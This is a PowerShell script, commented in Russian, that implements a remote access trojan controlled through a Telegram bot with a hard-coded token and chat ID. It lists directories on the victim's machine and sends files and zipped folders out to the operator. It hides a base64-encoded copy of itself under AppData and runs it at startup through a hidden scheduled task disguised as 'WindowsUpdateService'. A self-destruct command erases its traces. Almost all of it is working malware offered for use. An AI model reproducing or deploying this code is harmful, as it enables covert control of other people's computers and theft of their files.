# RAT через Telegram Bot
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"
$CurrentPath = [System.IO.Directory]::GetDirectoryRoot($PWD.Path)

function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    if ($FilePath) {
        $Form = @{
            chat_id = $ChatID
            document = [System.IO.File]::OpenRead($FilePath)
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/sendDocument" -Method Post -Form $Form
    } else {
        $Body = @{
            chat_id = $ChatID
            text = $Message
            parse_mode = "HTML"
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/sendMessage" -Method Post -Body $Body
    }
}

function Get-Commands {
    $HelpText = @"
Доступные команды:
/ls - показать содержимое текущей директории
/cd [путь] - сменить директорию
/download [путь] - скачать файл или папку
/selfdestruct - полное самоуничтожение RAT
"@
    Send-Telegram -Message $HelpText
}

function List-Directory {
    $Items = Get-ChildItem -Path $CurrentPath -Force
    $Result = "Содержимое $CurrentPath :`n"
    foreach ($Item in $Items) {
        $Type = if ($Item.PSIsContainer) { "DIR" } else { "FILE" }
        $Result += "[$Type] $($Item.Name)`n"
    }
    Send-Telegram -Message $Result
}

function Change-Directory {
    param([string]$NewPath)
    
    try {
        if (-not $NewPath) {
            Send-Telegram -Message "Укажите путь: /cd [путь]"
            return
        }
        
        if ($NewPath -eq "..") {
            $CurrentPath = Split-Path -Path $CurrentPath -Parent
            if (-not $CurrentPath) { $CurrentPath = [System.IO.Directory]::GetDirectoryRoot($PWD.Path) }
        } else {
            if (-not [System.IO.Path]::IsPathRooted($NewPath)) {
                $NewPath = Join-Path -Path $CurrentPath -ChildPath $NewPath
            }
            
            if (Test-Path -Path $NewPath -PathType Container) {
                $CurrentPath = $NewPath
            } else {
                Send-Telegram -Message "Директория не найдена: $NewPath"
                return
            }
        }
        Send-Telegram -Message "Текущая директория: $CurrentPath"
    } catch {
        Send-Telegram -Message "Ошибка смены директории: $($_.Exception.Message)"
    }
}

function Download-File {
    param([string]$TargetPath)
    
    try {
        if (-not $TargetPath) {
            Send-Telegram -Message "Укажите путь: /download [путь]"
            return
        }
        
        if (-not [System.IO.Path]::IsPathRooted($TargetPath)) {
            $TargetPath = Join-Path -Path $CurrentPath -ChildPath $TargetPath
        }
        
        if (Test-Path -Path $TargetPath) {
            if ((Get-Item $TargetPath).PSIsContainer) {
                $ZipPath = "$env:TEMP\$(Get-Random).zip"
                Compress-Archive -Path $TargetPath -DestinationPath $ZipPath -CompressionLevel Optimal
                Send-Telegram -FilePath $ZipPath
                Remove-Item $ZipPath -Force
            } else {
                Send-Telegram -FilePath $TargetPath
            }
        } else {
            Send-Telegram -Message "Файл или директория не найдены: $TargetPath"
        }
    } catch {
        Send-Telegram -Message "Ошибка загрузки: $($_.Exception.Message)"
    }
}

function SelfDestruct {
    try {
        $ScriptPath = $MyInvocation.MyCommand.Path
        Remove-Item -Path $ScriptPath -Force -ErrorAction SilentlyContinue
        
        $ScheduledTask = Get-ScheduledTask -TaskName "WindowsUpdateService" -ErrorAction SilentlyContinue
        if ($ScheduledTask) {
            Unregister-ScheduledTask -TaskName "WindowsUpdateService" -Confirm:$false
        }
        
        Send-Telegram -Message "RAT уничтожен"
        exit
    } catch {
        exit
    }
}

function Add-Persistence {
    $ScriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
    $EncodedScript = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ScriptContent))
    
    $PersistScript = @"
`$EncodedScript = '$EncodedScript'
`$DecodedScript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(`$EncodedScript))
Invoke-Expression `$DecodedScript
"@
    
    $PersistPath = "$env:APPDATA\Microsoft\Windows\system32.ps1"
    Set-Content -Path $PersistPath -Value $PersistScript -Encoding Unicode
    
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PersistPath`""
    $TaskTrigger = New-ScheduledTaskTrigger -AtStartup
    $TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
    Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Description "Windows Update Service" -Force
}

Add-Persistence
Send-Telegram -Message "RAT активирован"

while ($true) {
    try {
        $Updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates" -Method Get
        if ($Updates.result) {
            foreach ($Update in $Updates.result) {
                $Message = $Update.message
                if ($Message.text -and $Message.chat.id -eq $ChatID) {
                    $Command = $Message.text.Split(' ')[0]
                    $Argument = $Message.text.Substring($Command.Length).Trim()
                    
                    switch ($Command) {
                        "/help" { Get-Commands }
                        "/ls" { List-Directory }
                        "/cd" { Change-Directory -NewPath $Argument }
                        "/download" { Download-File -TargetPath $Argument }
                        "/selfdestruct" { SelfDestruct }
                        default { Send-Telegram -Message "Неизвестная команда. Введите /help для списка команд" }
                    }
                    
                    $LastUpdateID = $Update.update_id + 1
                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$LastUpdateID" -Method Get | Out-Null
                }
            }
        }
        Start-Sleep -Seconds 2
    } catch {
        Start-Sleep -Seconds 10
    }
}
